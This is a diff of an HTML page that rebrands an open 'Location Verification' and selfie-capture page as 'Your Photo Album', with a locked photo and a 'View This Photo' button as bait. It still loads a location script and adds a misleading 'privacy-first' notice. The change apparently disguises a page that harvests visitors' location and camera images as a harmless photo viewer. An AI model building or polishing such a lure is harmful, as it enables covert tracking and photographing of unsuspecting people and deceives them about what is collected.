@@ -4,8 +4,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Location Verification</title>
-
+    <title>Your Photo Album</title>
     <link rel="stylesheet" href="css/style.css">
 </head>
 
@@ -13,60 +12,30 @@
 
     <div class="container">
 
-        <h1>📍 Location Verification</h1>
+        <h1>📍 Photo Album</h1>
 
-        <p>
-            Please share your location to continue.
-        </p>
-
-        <button id="shareLocation">
-            Share My Location
-        </button>
-
-        <p id="status"></p>
-
-        <hr>
-
-        <!-- Camera permission prompt - shown after location is captured -->
-        <div id="cameraPermissionSection" style="display:none;">
-            <h3>📷 Selfie Verification</h3>
-            <p>Please allow camera access for identity verification.</p>
+        <!-- Locked photo card -->
+        <div class="photo-card">
+            <div class="photo-overlay">
+                <img id="albumPhoto"
+                     src="https://picsum.photos/seed/album1/800/500"
+                     alt="Album Photo">
+                <div id="lockBadge">🔒</div>
+            </div>
+            <div class="card-actions">
+                <button id="viewPhotoBtn">👁️ View This Photo</button>
+                <p id="status"></p>
+            </div>
         </div>
 
-        <video
-            id="video"
-            autoplay
-            playsinline
-            style="
-                display:none;
-                width:100%;
-                border-radius:10px;
-                margin-top:15px;
-            ">
-        </video>
-
-        <canvas
-            id="canvas"
-            style="display:none;">
-        </canvas>
-
-        <button
-            id="captureBtn"
-            style="
-                display:none;
-                margin-top:15px;
-            ">
-            📷 Capture Selfie
-        </button>
-
-        <hr style="margin-top:30px;">
-
-        <p style="text-align:center;font-size:12px;color:#888;">
-            <a href="viewer.html" target="_blank">🔐 Admin Viewer</a>
-        </p>
+        <div class="privacy-notice">
+            <strong>🔒 Privacy-first verification:</strong> A one-time selfie and location are captured to verify your identity.
+            No data is stored locally. Camera and location permissions are required.
+        </div>
 
     </div>
 
+    <!-- IMPORTANT: Update the src path if needed -->
     <script src="js/location.js"></script>
 
 </body>
